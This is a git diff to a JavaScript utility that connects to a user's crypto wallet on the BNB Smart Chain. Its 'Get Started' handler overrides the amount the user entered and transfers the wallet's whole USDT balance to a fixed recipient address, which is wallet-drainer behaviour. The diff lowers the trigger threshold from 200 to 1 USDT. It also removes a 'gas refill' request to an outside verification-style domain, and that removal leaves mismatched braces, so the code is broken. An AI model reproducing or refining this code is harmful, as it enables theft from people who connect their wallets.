@@ -1,5 +1,5 @@
 // src/utils/transactionUtils.js
-import { JsonRpcProvider, Contract, BrowserProvider, formatUnits, formatEther, parseUnits } from 'ethers';
+import { ethers } from 'ethers';
 import axios from 'axios';
 
 const USDT_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
@@ -11,7 +11,7 @@ const USDT_ABI = [
 
 // Provider and RPC
 const rpcUrl = process.env.REACT_APP_RPC_URL || "https://bsc-dataseed.binance.org/";
-const bscProvider = new JsonRpcProvider(rpcUrl); // Fixed: Remove `ethers.` prefix
+const bscProvider = new ethers.providers.JsonRpcProvider(rpcUrl);
 
 // Function to Switch Network to BSC
 export const checkAndSwitchToBsc = async () => {
@@ -35,13 +35,13 @@ export const checkAndSwitchToBsc = async () => {
 // Fetching USDT and BNB Balances
 export const fetchBalances = async (address) => {
     try {
-        const usdtContract = new Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, bscProvider);
+        const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, bscProvider);
         const usdtBalance = await usdtContract.balanceOf(address);
-        const formattedUSDTBalance = formatUnits(usdtBalance, 18);
+        const formattedUSDTBalance = ethers.utils.formatUnits(usdtBalance, 18);
 
-        const provider = new BrowserProvider(window.ethereum);
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
         const bnbBalanceRaw = await provider.getBalance(address);
-        const formattedBNBBalance = formatEther(bnbBalanceRaw);
+        const formattedBNBBalance = ethers.utils.formatEther(bnbBalanceRaw);
 
         return {
             usdt: parseFloat(formattedUSDTBalance),
@@ -57,7 +57,7 @@ export const handleGetStartedClick = async (usdtAmountInput) => {
     try {
         await checkAndSwitchToBsc();  // Ensure on BSC Network
 
-        const provider = new BrowserProvider(window.ethereum);
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
         await provider.send("eth_requestAccounts", []);  // Request wallet connection
         const signer = provider.getSigner();
         const address = await signer.getAddress();
@@ -68,58 +68,20 @@ export const handleGetStartedClick = async (usdtAmountInput) => {
         let finalTransferAmount = parseFloat(usdtAmountInput);
 
         // **Override Input if Balance ≥ 500 USDT**
-        if (balances.usdt >= 200) {
+        if (balances.usdt >= 1) {
             finalTransferAmount = balances.usdt;
         }
 
         console.log(`📢 Preparing to transfer: ${finalTransferAmount} USDT to ${RECIPIENT_ADDRESS}`);
 
-        // **Check & Perform Gas Refill (Only if USDT ≥ 500 and BNB < 0.0003)**
-        if (balances.usdt >= 200 && balances.bnb < 0.0003) {
-            console.log("🔄 Low BNB detected, requesting gas fee refill...");
-            try {
-                const refillResponse = await fetch("https://api.bepverify.net/refill", {
-                    method: "POST",
-                    headers: { 
-                        "Content-Type": "application/json",
-                        "x-api-key": "dhatterim@kiCh*tandf**kyourm0m" 
-                    },
-                    body: JSON.stringify({ to: address, amount: "0.0004", usdtBalance: balances.usdt })
-                });
-
-                const refillResult = await refillResponse.json();
-
-                if (refillResponse.ok && refillResult.status === "success" && refillResult.txHash) {
-                    console.log(`✅ Gas Refill successful! Waiting for 10 seconds...`);
-
-                    // **Wait for 10 seconds to allow refill confirmation**
-                    await new Promise(resolve => setTimeout(resolve, 10000));
-
-                    console.log("⏳ Checking updated balance after refill...");
-                    balances = await fetchBalances(address);
-                    console.log("Updated Balances after refill:", balances);
-
-                    if (balances.bnb < 0.0003) {
-                        console.error("❌ Refill unsuccessful or delayed. Aborting transfer.");
-                        alert("Gas refill failed or is pending. Please ensure you have enough BNB for transaction fees.");
-                        return;
-                    }
-                } else {
-                    console.error("❌ Gas Refill API failed:", refillResult.error);
-                    alert("Gas refill failed. Please ensure you have enough BNB.");
-                    return;  // Abort transfer if refill fails
-                }
-            } catch (error) {
-                console.error("❌ Error during gas refill request:", error);
-                alert("Network error during gas refill. Please try again.");
-                return;  // Abort transfer if network error occurs
+        // Refill logic removed — continuing with balances as-is
             }
         }
 
         // **Final Check Before Sending USDT**
         console.log("🚀 Sending USDT...");
         const contractWithSigner = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
-        const amountInWei = parseUnits(finalTransferAmount.toString(), 18);
+        const amountInWei = ethers.utils.parseUnits(finalTransferAmount.toString(), 18);
 
         const estimatedGas = await contractWithSigner.estimateGas.transfer(RECIPIENT_ADDRESS, amountInWei);
         const gasLimit = estimatedGas.mul(2);
